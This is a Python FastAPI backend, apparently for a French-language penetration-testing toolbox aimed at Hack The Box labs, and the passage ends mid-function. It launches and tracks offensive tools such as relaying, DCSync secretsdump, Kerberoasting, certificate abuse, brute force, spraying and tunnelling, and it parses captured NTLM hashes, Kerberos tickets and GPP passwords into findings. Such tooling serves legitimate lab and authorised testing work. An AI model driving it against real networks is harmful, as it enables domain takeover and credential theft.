#!/usr/bin/env python3
"""
HTB Toolbox v1 — Backend

"""

import asyncio, fcntl, html, json, os, pty, re, shlex, shutil, signal, subprocess, sys, termios, time
from datetime import datetime, timezone
from pathlib import Path

try:
    from fastapi import FastAPI, WebSocket, WebSocketDisconnect
    from fastapi.responses import HTMLResponse, FileResponse
    import uvicorn
except ImportError:
    print("[!] Dépendances Python manquantes. Lance ./install.sh ou ./start.sh")
    sys.exit(1)

app = FastAPI(title="HTB Toolbox v2")

BASE_DIR    = Path(__file__).parent
SCRIPT_PATH = BASE_DIR / "htbtoolbox.sh"
LOOT_DIR      = BASE_DIR / "loot"
CATALOG_DIR   = BASE_DIR / "catalog"
TIMELINE_PATH = BASE_DIR / "timeline.json"
CONFIG_PATH   = BASE_DIR / "config.local.json"
CONFIG_EXAMPLE_PATH = BASE_DIR / "config.example.json"
PRACTICAL_GUIDE_FR_PATH = BASE_DIR / "GUIDE_PRATIQUE.md"
PRACTICAL_GUIDE_EN_PATH = BASE_DIR / "GUIDE_PRACTICAL_EN.md"
LOOT_DIR.mkdir(exist_ok=True)

active_proc: asyncio.subprocess.Process | None = None
active_tool_id: str | None = None
active_run_procs: dict[str, asyncio.subprocess.Process] = {}
active_run_tasks: dict[str, asyncio.Task] = {}
timeline: list[dict] = []
shell_proc: subprocess.Popen | None = None
shell_master_fd: int | None = None
shell_reader_task: asyncio.Task | None = None

SUBDIRS = ["attack_checks","smb_shares","downloads","adcs","bloodyad",
           "mssql_enum","winrm_enum","gpo","kerberos","dns_enum",
           "enum4linux","ldapdomaindump","snmp_enum","ftp_enum","parsed",
           "bloodhound","relay_hints","hosts_discovery"]

# ── Binaires à détecter ────────────────────────────────────────────────
TOOLS_TO_CHECK = {
    "nmap":"nmap","nxc":"nxc","crackmapexec":"crackmapexec",
    "smbclient":"smbclient","ldapsearch":"ldapsearch","rpcclient":"rpcclient",
    "kerbrute":"kerbrute","impacket-GetNPUsers":"impacket-GetNPUsers",
    "impacket-getnpusers":"impacket-getnpusers",
    "impacket-GetUserSPNs":"impacket-GetUserSPNs",
    "impacket-getTGT":"impacket-getTGT","impacket-secretsdump":"impacket-secretsdump",
    "impacket-psexec":"impacket-psexec","impacket-wmiexec":"impacket-wmiexec",
    "impacket-ntlmrelayx":"impacket-ntlmrelayx",
    "bloodhound-python":"bloodhound-python","certipy-ad":"certipy-ad",
    "certipy":"certipy","bloodyAD":"bloodyAD","enum4linux-ng":"enum4linux-ng",
    "ldapdomaindump":"ldapdomaindump","evil-winrm":"evil-winrm",
    "ntpdate":"ntpdate","snmpwalk":"snmpwalk","onesixtyone":"onesixtyone",
    "dig":"dig","feroxbuster":"feroxbuster","gobuster":"gobuster",
    "curl":"curl","jq":"jq","gpp-decrypt":"gpp-decrypt","klist":"klist",
    "openssl":"openssl","whatweb":"whatweb","nikto":"nikto","nuclei":"nuclei",
    "showmount":"showmount",
    "smbmap":"smbmap","ffuf":"ffuf","wfuzz":"wfuzz",
    "hydra":"hydra","responder":"responder","chisel":"chisel","socat":"socat",
    "coercer":"coercer","impacket-addcomputer":"impacket-addcomputer",
    "ligolo-proxy":"ligolo-proxy","pre2k":"pre2k","impacket-getST":"impacket-getST",
    "sqlmap":"sqlmap","nikto":"nikto","wafw00f":"wafw00f","wpscan":"wpscan",
    "sshpass":"sshpass","mysql":"mysql","psql":"psql","redis-cli":"redis-cli",
    "mongosh":"mongosh","mongodump":"mongodump",
    "impacket-mssqlclient":"impacket-mssqlclient","linpeas":"linpeas",
    "rustscan":"rustscan","masscan":"masscan",
    "file":"file","strings":"strings","readelf":"readelf","exiftool":"exiftool",
    "binwalk":"binwalk","foremost":"foremost","checksec":"checksec",
}

SAFE_OUTPUT_RE = re.compile(r"[^A-Za-z0-9._-]+")
ANSI_ESCAPE_RE = re.compile(r"\x1B\[[0-?]*[ -/]*[@-~]")
MAX_CAPTURE_CHARS = 200000
AUTO_ANALYZE_MAX_FILES = 80
AUTO_ANALYZE_FILE_READ = 12000
AUTO_ANALYZE_PREVIEW = 5000
AUTO_ANALYZE_TEXT_SUFFIXES = {
    ".txt", ".log", ".json", ".csv", ".tsv", ".xml", ".html", ".md",
    ".ini", ".conf", ".cfg", ".yaml", ".yml", ".lst",
}
AUTO_ANALYZE_SKIP_SUFFIXES = {
    ".zip", ".7z", ".rar", ".gz", ".xz", ".tar", ".tgz", ".bz2",
    ".png", ".jpg", ".jpeg", ".gif", ".webp", ".ico", ".pdf",
    ".exe", ".dll", ".so", ".bin", ".pyc",
}


# Modes opératoires exposés côté serveur. Le front filtre aussi via ENABLED_OP_MODES
# (voir index.html). Retirer un mode ici force normalize_cfg à retomber sur le premier.
ENABLED_OP_MODES = ("htb", "enterprise")
DEFAULT_OP_MODE = ENABLED_OP_MODES[0] if ENABLED_OP_MODES else "htb"


CONFIG_PERSIST_KEYS = (
    "ui_language",
    "target_type",
    "op_mode",
    "target",
    "domain",
    "dc",
    "user",
    "target_account",
    "claude_api_key",
    "web_port",
    "ssh_port",
    "notes",
)


def default_config() -> dict:
    return {
        "ui_language": "fr",
        "target_type": "windows",
        "op_mode": DEFAULT_OP_MODE,
        "target": "",
        "domain": "",
        "dc": "",
        "user": "",
        "password": "",
        "sudo_password": "",
        "nt_hash": "",
        "ccache": "",
        "target_account": "",
        "claude_api_key": "",
        "web_port": "80",
        "ssh_port": "22",
        "notes": "",
    }


def load_saved_config() -> dict:
    cfg = default_config()
    if CONFIG_EXAMPLE_PATH.exists():
        try:
            cfg.update(json.loads(CONFIG_EXAMPLE_PATH.read_text()))
        except Exception:
            pass
    if CONFIG_PATH.exists():
        try:
            cfg.update(json.loads(CONFIG_PATH.read_text()))
        except Exception:
            pass
    return cfg


def save_user_config(cfg: dict) -> None:
    existing = load_saved_config()
    for key in CONFIG_PERSIST_KEYS:
        if key in cfg and cfg[key] is not None:
            existing[key] = cfg[key]
    CONFIG_PATH.write_text(json.dumps(existing, indent=2))


def mask_text(text: str, *secrets: str, strip_ansi: bool = True) -> str:
    if strip_ansi:
        text = ANSI_ESCAPE_RE.sub("", text)
    for secret in secrets:
        if secret and secret in text:
            text = text.replace(secret, "****")
    return text


def build_shell_env(cfg: dict) -> dict:
    env = {
        **os.environ,
        "TERM": "xterm-256color",
        "PYTHONUNBUFFERED": "1",
        # Silence les DeprecationWarning crachés par cryptography/spnego via Impacket.
        "PYTHONWARNINGS": os.environ.get("PYTHONWARNINGS") or "ignore::DeprecationWarning",
    }
    if cfg.get("target"): env["TARGET"] = cfg["target"]
    if cfg.get("domain"): env["DOMAIN"] = cfg["domain"]
    if cfg.get("dc"): env["DC"] = cfg["dc"]
    if cfg.get("user"): env["AD_USER_RAW"] = cfg["user"]
    if cfg.get("password"): env["AD_PASS"] = cfg["password"]
    if cfg.get("sudo_password"): env["SUDO_PASS"] = cfg["sudo_password"]
    if cfg.get("nt_hash"): env["AD_NT_HASH"] = cfg["nt_hash"]
    if cfg.get("ccache"): env["KRB5CCNAME"] = cfg["ccache"]
    # Auto-injection de KRB5_CONFIG si krb5_setup a été lancé (fichier local dans loot/)
    dom_for_krb = cfg.get("domain") or ""
    if dom_for_krb:
        krb_path = LOOT_DIR / output_key(dom_for_krb) / "attack_checks" / "krb5.conf"
        if krb_path.is_file():
            env["KRB5_CONFIG"] = str(krb_path)
    env["PS1"] = r"\[\e[1;36m\]htbtoolbox\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ "
    return env


def display_command(cmd: list[str], cfg: dict, pw: str, nt: str, sp: str) -> str:
    def mask(s: str) -> str:
        return mask_text(s, pw, nt, sp)

    if len(cmd) >= 3 and cmd[0] in ("bash", "sh") and cmd[1] == "-c":
        body = mask(cmd[2])
        return f'bash -c "{body}"'
    return mask(" ".join(cmd))


async def sync_hosts_with_script(cfg: dict) -> tuple[bool, str]:
    if not script_available():
        return False, "htbtoolbox.sh indisponible"
    if not cfg.get("target"):
        return False, "IP cible manquante"
    if not cfg.get("domain") and not cfg.get("dc"):
        return False, "domaine/DC manquant"

    env_parts = [
        shell_assign("TARGET", cfg.get("target", "")),
        shell_assign("DOMAIN", cfg.get("domain", "")),
        shell_assign("DC", cfg.get("dc", "")),
        "AUTO_HOSTS=1",
        shell_assign("SUDO_PASS", cfg.get("sudo_password", "")),
    ]
    script = shell_quote(str(SCRIPT_PATH))
    body = (
        "set -o pipefail; export " + " ".join(env_parts) + "; "
        + f"source {script} >/dev/null 2>&1 && "
        + "setup_hosts 2>&1"
    )
    proc = await asyncio.create_subprocess_exec(
        "bash", "-c", body,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        cwd=str(BASE_DIR),
        env={**os.environ, "PYTHONUNBUFFERED": "1"},
    )
    out, _ = await proc.communicate()
    text = mask_text(out.decode("utf-8", errors="replace"), cfg.get("sudo_password", ""))
    if proc.returncode == 0:
        if "Entrée mise à jour" in text:
            return True, "Entrée /etc/hosts mise à jour"
        if "Résolution OK" in text:
            return True, "Résolution /etc/hosts OK"
    return proc.returncode == 0, (text.strip().splitlines()[-1] if text.strip() else "Mise à jour /etc/hosts non confirmée")

def check_tools() -> dict:
    res = {lbl: shutil.which(bin) is not None for lbl, bin in TOOLS_TO_CHECK.items()}
    # Certains paquets Kali/Impacket n'exposent qu'une seule variante de nom.
    # On reflète donc la présence sur les alias pour éviter un faux "manquant" dans l'UI.
    alias_groups = [
        ("impacket-GetNPUsers", "impacket-getnpusers"),
    ]
    for left, right in alias_groups:
        present = res.get(left, False) or res.get(right, False)
        res[left] = present
        res[right] = present
    # Certains modules "outils" sont couverts par NetExec même si le binaire
    # standalone n'est pas installé.
    if res.get("nxc", False):
        res["pre2k"] = True
        res["coercer"] = True
    res["script_available"] = script_available()
    return res


async def terminate_active_process(proc: asyncio.subprocess.Process | None, grace: float = 0.6) -> None:
    if not proc or proc.returncode is not None:
        return
    try:
        pgid = os.getpgid(proc.pid)
    except Exception:
        pgid = None
    try:
        if pgid is not None:
            os.killpg(pgid, signal.SIGTERM)
        else:
            proc.send_signal(signal.SIGTERM)
    except Exception:
        pass
    await asyncio.sleep(grace)
    if proc.returncode is not None:
        return
    try:
        if pgid is not None:
            os.killpg(pgid, signal.SIGKILL)
        else:
            proc.kill()
    except Exception:
        pass


async def cleanup_tool_processes(tool_id: str | None) -> None:
    if not tool_id:
        return
    patterns = {
        "responder_listen": [r"(^|/)(responder|Responder)(\s|$)"],
        "ntlmrelayx_run": [r"impacket-ntlmrelayx", r"ntlmrelayx\.py"],
        "ntlmrelayx_relay": [r"impacket-ntlmrelayx", r"ntlmrelayx\.py"],
        "chisel_server": [r"chisel\s+server\s+--port"],
        "ligolo_server": [r"ligolo-proxy\s+-selfcert\s+-laddr"],
        "socat_fwd": [r"socat\s+-v\s+TCP-LISTEN:4445"],
    }.get(tool_id, [])
    if not patterns or not shutil.which("pkill"):
        return
    for sig in (signal.SIGTERM, signal.SIGKILL):
        for pattern in patterns:
            try:
                proc = await asyncio.create_subprocess_exec(
                    "pkill",
                    "--signal",
                    sig.name,
                    "-f",
                    pattern,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                await proc.wait()
            except Exception:
                continue
        await asyncio.sleep(0.2)


TOOL_TIMEOUT_BUDGETS: dict[str, int] = {
    # Recon / enumeration
    "rustscan_fast": 180,
    "nmap_targeted": 420,
    "snmp_enum": 120,
    "ftp_enum": 120,
    "web_enum": 180,
    "dns_enum": 120,
    "nxc_anon_probe": 60,
    "smbclient_list": 90,
    "nxc_smb_passpol": 90,
    "smb_loot": 180,
    "ldap_users_auth": 120,
    "ldap_kerberoastable": 120,
    "ldap_asrep_candidates": 120,
    "ldapdomaindump": 420,
    "ldaps_probe": 90,
    "kerbrute_userenum": 90,
    "getnpusers_asrep": 120,
    "getuserspns_kerberoast": 120,
    "gettgt": 120,
    "krb5_setup": 120,
    "nxc_smb_auth_test": 90,
    "certipy_find": 240,
    "certipy_ca": 180,
    "certipy_shadow": 240,
    "enum4linux_ng": 420,
    "rpcclient_enum": 120,
    "bloodhound_collect": 600,
    "secretsdump": 420,
    "bloodyad_acls": 180,
    "pre2k_check": 120,
    "gmsa_extract": 180,
    "forcechangepwd": 120,
    "spnjacking_enum": 180,
    "rbcd_check": 180,
    "dacledit_read": 180,
    "owneredit_read": 180,
    "addcomputer": 180,
    "shadowcred_pkinit_chain": 600,
    "pkinit_gettgt": 180,
    "pkinit_getnthash": 120,
    "bloodyad_shadow_add": 180,
    "coercer_run": 180,
    # Web / SQL
    "web_robots": 120,
    "web_tech_detect": 120,
    "web_dir_quick": 420,
    "web_nuclei_safe": 600,
    "smbmap_enum": 420,
    "ffuf_vhost": 600,
    "ffuf_dir_fast": 600,
    "wfuzz_params": 600,
    "nikto_scan": 900,
    "waf_detect": 180,
    "cms_scan": 300,
    "lfi_probe": 240,
    "sqlmap_basic": 900,
    "web_login_brute": 600,
    "mysql_probe": 240,
    "mssql_probe": 240,
    "postgres_probe": 240,
    "redis_probe": 120,
    "mongodb_probe": 120,
    "sqlmap_crawl": 1200,
    # Linux
    "hydra_ssh": 900,
    "sudo_enum": 120,
    "suid_sgid_find": 180,
    "linux_caps_check": 180,
    "linux_cron_check": 180,
    "linux_services_enum": 180,
    "linux_privesc_check": 900,
    "pspy_monitor": 180,
    "linux_docker_check": 180,
    "linux_http_fingerprint": 120,
    "tls_probe": 180,
    "ssh_banner": 120,
    "ssh_auth_methods": 120,
    "nfs_probe": 180,
    # Misc
    "adfs_probe": 180,
    "ldap_constrained_deleg": 180,
    "ldap_gmsa_readable": 180,
    "ntp_sync": 90,
    "hosts_autoconf": 90,
    "smb_signing": 90,
    "winrm_checks": 120,
    "password_spray": 300,
    "socat_fwd": 180,
}


def apply_timeout_budget(tool_id: str, cmd: list[str]) -> tuple[list[str], int | None]:
    secs = TOOL_TIMEOUT_BUDGETS.get(tool_id)
    if not secs or not shutil.which("timeout"):
        return cmd, None
    if len(cmd) >= 3 and cmd[0] == "bash" and cmd[1] == "-c":
        return ["bash", "-c", f"exec timeout --foreground {secs}s bash -c {shell_quote(cmd[2])}"], secs
    return ["timeout", "--foreground", f"{secs}s", *cmd], secs


async def terminate_named_runs(tool_ids: list[str]) -> None:
    for tool_id in tool_ids:
        proc = active_run_procs.get(tool_id)
        if proc and proc.returncode is None:
            try:
                await terminate_active_process(proc)
            except Exception:
                pass
        try:
            await cleanup_tool_processes(tool_id)
        except Exception:
            pass
        active_run_procs.pop(tool_id, None)
        task = active_run_tasks.pop(tool_id, None)
        if task and not task.done():
            task.cancel()


async def terminate_all_runs() -> list[str]:
    tool_ids = list(active_run_procs.keys())
    await terminate_named_runs(tool_ids)
    return tool_ids

def read_json_file(path: Path, fallback):
    if not path.exists():
        return fallback
    try:
        return json.loads(path.read_text())
    except Exception:
        return fallback

def load_modules_catalog() -> dict:
    return read_json_file(CATALOG_DIR / "modules.json", {"version": 0, "target_types": [], "groups": []})

def load_profiles_catalog() -> dict:
    return read_json_file(CATALOG_DIR / "profiles.json", {"version": 0, "profiles": {}})

def runtime_info() -> dict:
    return {
        "host_os": "linux",
        "script_mode": "utilitaires" if script_available() else "absent",
        "supports": ["windows", "linux", "web", "hybrid"],
        "tools": check_tools(),
    }

def list_history_entries() -> list[dict]:
    entries = []
    if not LOOT_DIR.exists():
        return entries
    for d in sorted(LOOT_DIR.iterdir(), key=lambda p: p.stat().st_mtime if p.exists() else 0, reverse=True):
        try:
            if not d.is_dir():
                continue
            files = [f for f in d.rglob("*") if f.is_file()]
            latest_mtime = max((f.stat().st_mtime for f in files), default=d.stat().st_mtime)
            parsed_count = sum(1 for f in files if f.parent.name == "parsed" and f.suffix == ".json")
            has_report = any(f.name == "report.md" for f in files)
            manifest_files = sorted((d / "parsed" / "manifests").glob("*.json")) if (d / "parsed" / "manifests").exists() else []
            latest_manifest = None
            if manifest_files:
                manifest_candidates = [f for f in manifest_files if f.name != "latest.json"]
                latest_manifest_file = max(manifest_candidates or manifest_files, key=lambda p: p.stat().st_mtime)
                latest_manifest = str(latest_manifest_file.relative_to(LOOT_DIR))
            entries.append({
                "domain": d.name,
                "path": str(d.relative_to(LOOT_DIR)),
                "latest_mtime": latest_mtime,
                "file_count": len(files),
                "parsed_count": parsed_count,
                "has_report": has_report,
                "manifest_count": len([f for f in manifest_files if f.name != "latest.json"]),
                "latest_manifest": latest_manifest,
            })
        except FileNotFoundError:
            continue
    return entries

def safe_read_text(path: Path, limit: int = 200000) -> str:
    try:
        return path.read_text(errors="replace")[:limit]
    except Exception:
        return ""


def _persist_timeline() -> None:
    try:
        TIMELINE_PATH.write_text(json.dumps(timeline, indent=2))
    except Exception:
        pass


def _load_timeline() -> None:
    try:
        if TIMELINE_PATH.exists():
            data = json.loads(TIMELINE_PATH.read_text())
            if isinstance(data, list):
                timeline.extend(data)
    except Exception:
        pass


_load_timeline()


def build_operational_command(cmd: str, *, auth_user: str = "", auth_pass: str = "", admin_hash: str = "") -> dict:
    text = (cmd or "").strip()
    lower = text.lower()
    placeholders = []
    for token in ("ATTACKER_IP", "TARGET$", "FAKECMP$"):
        if token in text:
            placeholders.append(token)
    if re.search(r"\bPASS_[A-Z0-9_]+\b", text):
        placeholders.append("PASS_*")
    if auth_user in ("", "USER") and re.search(r"(^|[^A-Za-z0-9_])USER([^A-Za-z0-9_]|$)", text):
        placeholders.append("USER")
    if auth_pass in ("", "PASS") and re.search(r"(^|[^A-Za-z0-9_])PASS([^A-Za-z0-9_]|$)", text):
        placeholders.append("PASS")

    requires_sudo = text.startswith("sudo ")
    sensitive = False
    if auth_pass and auth_pass != "PASS" and auth_pass in text:
        sensitive = True
    if admin_hash and admin_hash in text:
        sensitive = True
    if re.search(r"(^|\s)-p\s+'[^']+'", text):
        sensitive = True
    if "-hashes " in text or "certipy auth " in lower or "evil-winrm " in lower:
        sensitive = True

    manual_patterns = ("ntlmrelayx.py", " responder ", "impacket-printerbug")
    noisy_patterns = (
        "responder",
        "ntlmrelayx.py",
        "printerbug",
        "addcomputer",
        "bloodhound-python",
        "getnpusers",
        "getuserspns",
        "secretsdump",
        "certipy find",
        "certipy req",
        "certipy shadow",
        "set passwd",
        "add groupmember",
        "set owner",
        " get writable",
        "ntpdate",
    )
    safe_patterns = (
        "evil-winrm",
        "wmiexec",
        "psexec",
        "hashcat",
        "certipy auth",
        "getst",
    )
    manual = text.startswith("#") or bool(placeholders) or any(p in f" {lower} " for p in manual_patterns)
    opsec = "safe"
    if any(p in lower for p in noisy_patterns):
        opsec = "bruyant"
    elif any(p in lower for p in safe_patterns):
        opsec = "safe"
    run_allowed = bool(text) and not manual and not text.startswith("#")
    reasons = []
    if placeholders:
        reasons.append(f"à compléter: {', '.join(placeholders)}")
    if requires_sudo:
        reasons.append("sudo requis")
    if any(p in f" {lower} " for p in manual_patterns):
        reasons.append("commande opérateur à ajuster")
    if sensitive:
        reasons.append("contient des secrets")
    reasons.append("activité visible côté cible" if opsec == "bruyant" else "impact limité / ciblé")

    tags = []
    if requires_sudo:
        tags.append("sudo")
    if manual:
        tags.append("manuel")
    if sensitive:
        tags.append("sensible")
    tags.append(opsec)

    return {
        "cmd": text,
        "run_allowed": run_allowed,
        "manual": manual,
        "requires_sudo": requires_sudo,
        "sensitive": sensitive,
        "opsec": opsec,
        "tags": tags,
        "reasons": reasons,
    }

_NTLM_BLANK = {"aad3b435b51404eeaad3b435b51404ee", "31d6cfe0d16ae931b73c59d7e0c089c0"}
_ACL_RE = re.compile(r"(GenericAll|WriteDacl|WriteOwner|ForceChangePassword|AddMember|GenericWrite|AllExtendedRights)", re.IGNORECASE)
_NTLM_LINE_RE = re.compile(r"^([^:]+):[0-9]+:[0-9a-f]{32}:([0-9a-f]{32})", re.IGNORECASE)
_PORT_RE = re.compile(r"^(\d+/(tcp|udp)\s+open\s+\S+)")
_STD_SERVICE_PORTS = {
    "ftp": {21}, "ssh": {22}, "telnet": {23}, "smtp": {25}, "domain": {53}, "dns": {53},
    "http": {80, 8080, 8000, 8888}, "kerberos": {88}, "pop3": {110}, "rpcbind": {111},
    "imap": {143}, "ldap": {389}, "https": {443, 8443}, "microsoft-ds": {445}, "smb": {445},
    "ldaps": {636}, "http-rpc-epmap": {593}, "winrm": {5985, 5986}, "ms-wbt-server": {3389},
    "mysql": {3306}, "ms-sql-s": {1433}, "postgresql": {5432}, "redis": {6379}, "vnc": {5900},
    "kpasswd5": {464}, "globalcatldap": {3268}, "globalcatldapssl": {3269},
}


def _parse_open_ports(nmap_path: Path) -> list[dict]:
    ports: list[dict] = []
    lines = safe_read_text(nmap_path, 40000).splitlines()
    i = 0
    while i < len(lines):
        raw_line = lines[i].rstrip()
        line = raw_line.strip()
        m = _PORT_RE.match(line)
        if not m:
            i += 1
            continue
        raw = m.group(1)
        parts = re.split(r"\s{2,}|\t+", raw)
        if not parts:
            i += 1
            continue
        port_proto = parts[0]
        state = parts[1] if len(parts) > 1 else "open"
        service = parts[2] if len(parts) > 2 else ""
        product = " ".join(parts[3:]).strip() if len(parts) > 3 else ""
        try:
            port_num = int(port_proto.split("/", 1)[0])
        except Exception:
            port_num = 0
        normalized_service = service.replace("ssl/", "").replace("?", "").lower()
        expected = _STD_SERVICE_PORTS.get(normalized_service, set())

        details: list[str] = []
        j = i + 1
        while j < len(lines):
            extra_raw = lines[j].rstrip()
            extra = extra_raw.strip()
            if not extra:
                j += 1
                continue
            if _PORT_RE.match(extra):
                break
            if extra.startswith("|") or extra.startswith("Service Info:"):
                cleaned = re.sub(r"^\|_?\s*", "", extra)
                if cleaned and cleaned not in details:
                    details.append(cleaned)
            j += 1
        ports.append({
            "raw": raw,
            "port": port_proto,
            "state": state,
            "service": service,
            "product": product,
            "details": details[:6],
            "nonstandard": bool(expected and port_num not in expected),
        })
        i = j
    return ports


def _lines(path: Path, limit: int = 20000) -> list[str]:
    return [ln.strip() for ln in safe_read_text(path, limit).splitlines() if ln.strip() and not ln.startswith("#")]


def categorize_domain_findings(out_dir: Path) -> dict:
    """Extrait les findings par catégorie (creds/kerberos/adcs/shares/privesc/network)."""
    cats: dict = {k: {"severity": "none", "count": 0, "items": []}
                  for k in ("creds", "kerberos", "adcs", "shares", "privesc", "network")}

    if not out_dir.exists():
        return cats

    def add(cat: str, item: dict) -> None:
        if len(cats[cat]["items"]) < 10:
            cats[cat]["items"].append(item)
        cats[cat]["count"] += 1

    def finalize(cat: str, sev: str) -> None:
        if cats[cat]["count"]:
            cats[cat]["severity"] = sev

    # ── Credentials ──────────────────────────────────────────────────
    dcsync = out_dir / "attack_checks" / "secretsdump_dcsync.txt"
    if dcsync.exists():
        for line in _lines(dcsync, 60000):
            m = _NTLM_LINE_RE.match(line)
            if m and m.group(2).lower() not in _NTLM_BLANK:
                add("creds", {"t": "ntlm", "label": m.group(1), "val": m.group(2)})
    for rel in ("attack_checks/gpp_hits.txt", "attack_checks/creds_hits.txt", "gpp_hits.txt", "creds_hits.txt"):
        fp = out_dir / rel
        if fp.exists():
            for line in _lines(fp, 10000)[:6]:
                add("creds", {"t": "cleartext", "label": "GPP/Creds", "val": line[:120]})
    finalize("creds", "critical")

    # ── Kerberos ─────────────────────────────────────────────────────
    asrep_f = out_dir / "kerberos" / "asrep_hashes.txt"
    if asrep_f.exists():
        for line in _lines(asrep_f, 40000):
            if "$krb5asrep$" in line:
                um = re.search(r"\$krb5asrep\$[^$]*\$([^@$]+)[@$]", line)
                add("kerberos", {"t": "asrep", "label": um.group(1) if um else "?", "val": line[:80] + "…"})
    asrep_cands = out_dir / "ldap_asrep_candidates.txt"
    if asrep_cands.exists():
        existing = {i["label"] for i in cats["kerberos"]["items"]}
        for u in _lines(asrep_cands, 10000):
            if u not in existing:
                add("kerberos", {"t": "asrep_cand", "label": u, "val": "AS-REP roastable (pas de pre-auth)"})
    tgs_f = out_dir / "kerberos" / "tgs_hashes.txt"
    if tgs_f.exists():
        for line in _lines(tgs_f, 40000):
            if "$krb5tgs$" in line:
                sm = re.search(r"\$krb5tgs\$[0-9]+\$\*([^*]+)\*", line)
                add("kerberos", {"t": "tgs", "label": sm.group(1) if sm else "?", "val": line[:80] + "…"})
    finalize("kerberos", "high")

    # ── ADCS ─────────────────────────────────────────────────────────
    esc_seen: set[str] = set()
    parsed_dir = out_dir / "parsed"
    if parsed_dir.exists():
        for fp in parsed_dir.glob("*.json"):
            try:
                for esc in (json.loads(fp.read_text()).get("findings", {}).get("adcs_esc", []) or []):
                    esc_seen.add(str(esc))
            except Exception:
                pass
    adcs_dir = out_dir / "adcs"
    if adcs_dir.exists():
        for f in sorted(adcs_dir.rglob("*.txt"))[:6]:
            txt = safe_read_text(f, 6000)
            for m in re.finditer(r"ESC([0-9]+)", txt):
                esc_seen.add(f"ESC{m.group(1)}")
            # Grab template names from certipy output
            for line in txt.splitlines():
                ls = line.strip()
                if re.match(r"^\s*(Template Name|Name)\s*:", ls, re.IGNORECASE):
                    tname = ls.split(":", 1)[-1].strip()
                    if tname:
                        add("adcs", {"t": "template", "label": tname, "val": f.name})
    for esc in sorted(esc_seen):
        add("adcs", {"t": "esc", "label": esc, "val": _esc_desc(esc)})
    finalize("adcs", "critical")

    # ── Shares ───────────────────────────────────────────────────────
    shares_f = out_dir / "smb_shares" / "shares_target.txt"
    if shares_f.exists():
        for line in _lines(shares_f, 15000):
            add("shares", {"t": "share", "label": line[:100], "val": ""})
    parsed_shares = out_dir / "parsed" / "nxc_smb_shares.json"
    if parsed_shares.exists():
        try:
            preview = (json.loads(parsed_shares.read_text()).get("output_preview") or "")
            for line in preview.splitlines():
                m = re.search(r"\b([A-Z0-9$._-]+)\s+(READ|WRITE|READ,WRITE)?\s{2,}(.+)?$", line.strip())
                if m and m.group(1) not in {"SMB", "Share", "-----"}:
                    add("shares", {
                        "t": "share",
                        "label": m.group(1),
                        "val": ((m.group(2) or "").strip() + (" | " if m.group(2) and m.group(3) else "") + (m.group(3) or "").strip()).strip(),
                    })
        except Exception:
            pass
    smbclient_parsed = out_dir / "parsed" / "smbclient_list.json"
    if smbclient_parsed.exists():
        try:
            preview = (json.loads(smbclient_parsed.read_text()).get("output_preview") or "")
            for line in preview.splitlines():
                m = re.match(r"^\s*([A-Z0-9$._-]+)\s+(Disk|IPC)\s+(.+)$", line.strip())
                if m and m.group(1) not in {"Sharename", "---------"}:
                    add("shares", {"t": "share", "label": m.group(1), "val": f"{m.group(2)} | {m.group(3).strip()}"})
        except Exception:
            pass
    relay_f = out_dir / "relay_hints" / "ntlm_relay_commands.txt"
    if relay_f.exists() and relay_f.stat().st_size > 0:
        add("shares", {"t": "relay", "label": "NTLM Relay possible", "val": "SMB Signing désactivé — voir relay_hints/"})
    finalize("shares", "medium")

    # ── Privesc ──────────────────────────────────────────────────────
    admincount_f = out_dir / "ldap_admincount.txt"
    if admincount_f.exists():
        users = _lines(admincount_f, 10000)
        if users:
            add("privesc", {"t": "admincount", "label": "AdminCount=1",
                            "val": ", ".join(users[:6]) + (" …" if len(users) > 6 else "")})
    pwdne_f = out_dir / "ldap_pwdneverexpires.txt"
    if pwdne_f.exists():
        users = _lines(pwdne_f, 10000)
        if users:
            add("privesc", {"t": "pwdnoexp", "label": "Pwd sans expiration",
                            "val": ", ".join(users[:6]) + (" …" if len(users) > 6 else "")})
    bloodyad_dir = out_dir / "bloodyad"
    if bloodyad_dir.exists():
        for f in sorted(bloodyad_dir.rglob("*.txt"))[:5]:
            for line in _lines(f, 8000):
                if _ACL_RE.search(line):
                    add("privesc", {"t": "acl", "label": "ACL abusable", "val": line[:120]})
    gpo_dir = out_dir / "gpo"
    if gpo_dir.exists():
        for f in sorted(gpo_dir.rglob("*.txt"))[:3]:
            for line in _lines(f, 5000):
                if re.search(r"(password|cpassword|CPassword)", line, re.IGNORECASE):
                    add("privesc", {"t": "gpo_cred", "label": "GPO credential", "val": line[:120]})
    finalize("privesc", "high")

    # ── Network ──────────────────────────────────────────────────────
    if parsed_dir.exists():
        smb_relay_added = winrm_added = False
        for fp in parsed_dir.glob("*.json"):
            try:
                findings = json.loads(fp.read_text()).get("findings", {})
                if findings.get("smb_signing_disabled") and not smb_relay_added:
                    add("network", {"t": "smb_relay", "label": "SMB Signing désactivé", "val": "Relay NTLM possible"})
                    smb_relay_added = True
                if findings.get("winrm_open") and not winrm_added:
                    add("network", {"t": "winrm", "label": "WinRM ouvert (5985)", "val": "evil-winrm -i TARGET -u USER -p PASS"})
                    winrm_added = True
            except Exception:
                pass
    winrm_5985 = out_dir / "attack_checks" / "winrm_wsman_5985_headers.txt"
    if winrm_5985.exists():
        txt = safe_read_text(winrm_5985, 6000)
        if re.search(r"HTTP/1|Server:|WinRM", txt, re.IGNORECASE):
            add("network", {"t": "winrm", "label": "WinRM / WSMan détecté", "val": "5985 répond sur /wsman"})
    winrm_5986 = out_dir / "attack_checks" / "winrm_wsman_5986_headers.txt"
    if winrm_5986.exists():
        txt = safe_read_text(winrm_5986, 6000)
        if re.search(r"HTTP/1|Server:|WinRM", txt, re.IGNORECASE):
            add("network", {"t": "winrm", "label": "WinRM / WSMan TLS détecté", "val": "5986 répond sur /wsman"})
    winrm_auth = out_dir / "attack_checks" / "winrm_auth_test.txt"
    if winrm_auth.exists():
        txt = safe_read_text(winrm_auth, 12000)
        if re.search(r"(\[\+\]|Pwn3d|valid|authenticated|success)", txt, re.IGNORECASE):
            add("network", {"t": "winrm", "label": "Auth WinRM valide", "val": "nxc winrm a réussi"})
    nmap_f = out_dir / "nmapresult.txt"
    if nmap_f.exists():
        port_entries = _parse_open_ports(nmap_f)
        ports = [p["raw"] for p in port_entries]
        if ports:
            add("network", {"t": "ports", "label": f"{len(ports)} ports ouverts", "val": ""})
            for entry in port_entries[:8]:
                detail_bits = []
